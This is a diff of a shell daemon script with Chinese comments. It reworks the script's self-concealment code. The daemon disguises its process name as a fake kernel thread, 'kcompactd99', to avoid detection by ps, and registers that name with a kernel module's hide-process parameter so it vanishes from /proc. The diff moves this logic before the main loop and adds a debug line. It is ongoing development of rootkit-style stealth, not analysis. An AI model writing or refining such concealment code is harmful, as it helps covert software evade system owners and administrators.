@@ -15,24 +15,6 @@ trap 'rm -f "$PID_FILE"' EXIT
 # ---------- 伪装进程名 + 自我隐藏 ----------
 # 把 comm 改成看起来像内核线程的名字，避免 ps -A | grep daemon 发现
 # 注意：comm 最长 15 字符；kcompactd99 不存在于标准内核
-echo "kcompactd99" > /proc/self/comm 2>/dev/null
-
-# 把自己加进 pkgmask 的 hide_proc_names，并从 /proc 里隐藏
-self_hide_proc() {
-    local hpn="/sys/module/pkgmask/parameters/hide_proc_names"
-    local hpe="/sys/module/pkgmask/parameters/hide_proc_enabled"
-    local hrl="/sys/module/pkgmask/parameters/reload"
-    [ -w "$hpn" ] || return 0
-    local cur
-    cur=$(cat "$hpn" 2>/dev/null)
-    case ",$cur," in
-        *",kcompactd99,"*) ;;
-        *)
-            echo "${cur:+$cur,}kcompactd99" > "$hpn" 2>/dev/null
-            echo 1 > "$hpe" 2>/dev/null
-            echo 1 > "$hrl" 2>/dev/null
-            ;;
-    esac
 }
 self_hide_proc
 LAST_ACTION=""
@@ -359,6 +341,23 @@ handle_action() {
 
 # ---------- 主循环 ----------
 echo "=== daemon start $(date) ===" >> "$RUN_DIR/daemon.log"
+# ---------- 伪装进程名 + 自我隐藏 ----------
+# 必须在主循环前执行，此时 /proc/self 一定指向当前 shell 进程
+echo "kcompactd99" > /proc/self/comm 2>/dev/null
+echo "DEBUG: comm=$(cat /proc/self/comm 2>/dev/null) pid=$$ ppid=$PPID" >> "$RUN_DIR/daemon.log"
+
+if [ -w /sys/module/pkgmask/parameters/hide_proc_names ]; then
+    _hpn=/sys/module/pkgmask/parameters/hide_proc_names
+    _cur=$(cat "$_hpn" 2>/dev/null)
+    case ",$_cur," in
+        *",kcompactd99,"*) ;;
+        *)
+            echo "${_cur:+$_cur,}kcompactd99" > "$_hpn" 2>/dev/null
+            echo 1 > /sys/module/pkgmask/parameters/hide_proc_enabled 2>/dev/null
+            echo 1 > /sys/module/pkgmask/parameters/reload 2>/dev/null
+            ;;
+    esac
+fi
 LOOP=0
 ACTIVE_LOOPS=0
 IDLE=$(get_config daemon_interval_idle 15)
